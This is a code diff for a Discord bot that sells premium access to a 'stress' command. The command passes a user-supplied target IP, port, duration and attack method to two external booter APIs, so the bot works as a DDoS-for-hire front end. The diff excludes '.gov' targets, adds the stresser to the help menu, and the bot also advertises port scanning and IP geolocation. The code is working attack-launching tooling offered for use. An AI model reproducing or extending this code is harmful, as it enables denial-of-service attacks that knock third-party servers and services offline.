@@ -106,22 +106,26 @@ client.on('message', async (message) => {
       let port = config.CurrentMSG.arg[2];
       let time = config.CurrentMSG.arg[3];
       let method = config.CurrentMSG.arg[4];
-      if(crud.isPremium(config.CurrentUser.Discord_id)) {
-        if(message.content.split(" ").length < 4) {
-          sendmsg("Error", "Missing arguments\nUsage: " + config.BotInfo.Prefix + "stress <ip> <port> <time>");
-        } else {
-          fetch(config.BOOTERAPI + ip + "&port=" + port + "&time=" + time + "&type=" + method).then(res => res.text()).then(body => {
-            let resp = body;
-            console.log(body);
-            bootembed(ip, port, time, method, "True", extra.currentTime());
-          });
-          fetch(config.BOOTERAPI1 + ip + "&port=" + port + "&time=" + time + "&method=" + method).then(res => res.text()).then(body => {
-            let resp = body;
-            console.log(body);
-          });
-        }
+      if(ip.includes(".gov")) {
+        sendmsg("Error", "You cannot hit ``.gov`` sites here skid");
       } else {
-        sendmsg("Error", "You aren't premium!");
+        if(crud.isPremium(config.CurrentUser.Discord_id)) {
+          if(message.content.split(" ").length < 4) {
+            sendmsg("Error", "Missing arguments\nUsage: " + config.BotInfo.Prefix + "stress <ip> <port> <time>");
+          } else {
+            fetch(config.BOOTERAPI + ip + "&port=" + port + "&time=" + time + "&type=" + method).then(res => res.text()).then(body => {
+              let resp = body;
+              console.log(body);
+              bootembed(ip, port, time, method, "True", extra.currentTime());
+            });
+            fetch(config.BOOTERAPI1 + ip + "&port=" + port + "&time=" + time + "&method=" + method).then(res => res.text()).then(body => {
+              let resp = body;
+              console.log(body);
+            });
+          }
+        } else {
+          sendmsg("Error", "You aren't premium!");
+        }
       }
     } else if(message.content.startsWith(config.BotInfo.Prefix + "bot_inv")) {
       sendmsg("Bot invite", "Spread out the bot by inviting it to your server! Link: " + config.BotInfo.Bot_Invite);
@@ -143,8 +147,7 @@ client.on('message', async (message) => {
   } else if(message.content.startsWith(config.BotInfo.Prefix + "register")) {
       sendmsg("Register", crud.register(message.author.tag, message.author.id))
   } else if(message.content.startsWith(config.BotInfo.Prefix)) {
-      sendmsg("Error", "You aren't registered")
-      //message.channel.send("Error, You aren't registered ");
+      sendmsg("Error", "You aren't registered. Type ``>register`` to register today!");
   }
 
   function sendmsg(titlel, descriptionl) {
@@ -167,9 +170,10 @@ client.on('message', async (message) => {
 		  //{ name: '\u200B', value: '\u200B' },
         { name: 'Help | Command list', value: config.BotInfo.Prefix + 'help'},
 	    	{ name: 'GeoIP | IP Location', value: config.BotInfo.Prefix + 'geo <method(all/isp)> <ip>'},
-	    	{ name: 'Port Scan | Grab open ports on a IP', value: config.BotInfo.Prefix + 'pscan <ip>'},
+	    	{ name: 'Port Scan | Grab open ports on a IP', value: config.BotInfo.Prefix + 'scan <ip>'},
 	    	{ name: 'Prices | Bot plans and link to buy now!', value: config.BotInfo.Prefix + 'prices'},
-	    	{ name: 'Methods | List of methods for premium users', value: config.BotInfo.Prefix + 'methods'},
+        { name: 'Methods | List of methods for premium users', value: config.BotInfo.Prefix + 'methods'},
+        { name: 'Stress | Stresser', value: config.BotInfo.Prefix + 'stress <ip> <port> <time> <method>'},
 	    	{ name: 'Bot Invite | Invite this bot to your server', value: config.BotInfo.Prefix + 'bot_inv'},
 	    	{ name: "Traumatized's Server | Traumatized's Personal Server Invite", value: config.BotInfo.Prefix + 'server_inv'},
 	    	{ name: "About | Credits and contact info", value: config.BotInfo.Prefix + 'credits'},
